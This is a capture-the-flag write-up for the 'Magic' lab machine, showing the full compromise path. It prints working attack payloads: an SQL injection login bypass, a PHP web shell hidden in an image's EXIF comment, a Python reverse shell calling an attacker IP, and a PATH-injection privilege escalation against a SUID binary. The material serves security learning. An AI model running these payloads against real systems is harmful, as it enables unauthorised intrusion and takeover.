I began with some simple enumeration scans:

I was able to identify SQL Injection on a login page, at http://10.10.10.185/login.php, using the following in the username and password fields:

{% highlight bash linenos %}
Username: ' or 1=1 --
Password: ' or 1=1 --
{% endhighlight %}

I tried to upload a PHP reverse shell, but got an error back asking `What are you trying to do here!?` so obviously it is blocked. By changing .php to .jpg resulted in the same error, so moved on. I downloaded an image from the internet, named it index.jpeg and used exfiltool to make a malicious image file:

{% highlight bash linenos %}
exiftool -Comment='<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>' index.jpeg
{% endhighlight %}

Once I uploaded, I used BURP to intercept the image file, and sent to repeater. Once in repeater, I changed the filename to index.php.jpeg and sent the POST forward:

<img src="/images/posts/magic_walkthrough/burp_repeater.png" alt="burp_repeater">

Once the malicious image was uploaded, I went back to the home page that was full of images, and I found that images were uploaded to `/images/uploads`. With this, I went to my image at `10.10.10.186/images/uploads/index.php.jpeg` and could then run commands:


{% highlight bash linenos %}
http://10.10.10.185/images/uploads/index.php.jpeg?cmd=ls
{% endhighlight %}

Then, I got to work on a reverse shell! There were many shells that would not connect back. Eventually, I found python3 in `/usr/bin` and used a python reverse shell using my web shell:

{% highlight bash linenos %}
/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.64",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
http://10.10.10.185/images/uploads/index.php.jpeg?cmd=ls
{% endhighlight %}

And I got a reverse shell back:

<center><img src="/images/posts/magic_walkthrough/shell.png" alt="shell"></center>

I then began enumerating the `/var/www/Magic directory`, working my way down. Eventually I came across a `bk.sql` file, that had hardcoded credentials:

<center><img src="/images/posts/magic_walkthrough/bk-sql.png" alt="bk-sql"></center>

It did not work for root, but there is another user on the system, `theseus`. I was able to log right in as that user:

<center><img src="/images/posts/magic_walkthrough/theseus.png" alt="theseus"></center>

And I owned user:

{% highlight bash linenos %}
cat /home/theseus/user.txt
xxxxxxxxxxxxxxxxxxxxff70c41c8b037eaab
{% endhighlight %}

While enumerating for root, I found that the `sysinfo` binary had SUID set:

{% highlight bash linenos %}
find / -perm -u=s -type f 2>/dev/null
...
/bin/sysinfo
...
{% endhighlight %}

Looking on the internet, there are a lot of MagniComp vulnerabilities that appeared for this binary. Ultimately, this was a combination of two attacks to get root. First, was a PATH injection. I had to set a path, in this case `/tmp`, into the `$PATH` variable for a malicious binary to run:

<center><img src="/images/posts/magic_walkthrough/path-injection.png" alt="path-injection"></center>

And now that we have our path set, let's make the malicious binary. When sysinfo runs, it calls lshw to look at the hardware on the system. Make a malicious lshw file:

{% highlight bash linenos %}
echo "/bin/cat /root/root.txt" > lshw
chmod 777 lshw
{% endhighlight %}

Then once sysinfo is run, you will have root!

{% highlight bash linenos %}
cat /root/root.txt
xxxxxxxxxxxxxxxxxx051a7763c65c29a26f4
{% endhighlight %}
